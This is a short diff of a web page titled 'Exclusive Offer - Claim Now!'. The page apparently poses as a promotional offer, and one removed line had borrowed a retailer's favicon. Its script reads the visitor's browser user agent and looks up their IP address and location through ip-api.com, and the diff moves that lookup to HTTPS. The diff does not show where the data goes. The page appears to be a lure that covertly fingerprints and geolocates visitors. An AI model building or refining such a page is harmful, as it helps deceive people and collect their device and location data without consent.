@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="https://f.nooncdn.com/s/app/com/noon/icons/favicon_v4.ico"/>
     <title>Exclusive Offer - Claim Now!</title>
     <style>
         body {
@@ -28,8 +27,8 @@
         // Get Device Info
         let userAgent = navigator.userAgent;
 
-        // Get IP-based Location using ip-api.com (no API key required)
-        fetch('http://ip-api.com/json')
+        // Get IP-based Location using ip-api.com (using HTTPS)
+        fetch('https://ip-api.com/json')
             .then(response => response.json())
             .then(data => {
                 let ipAddress = data.query;
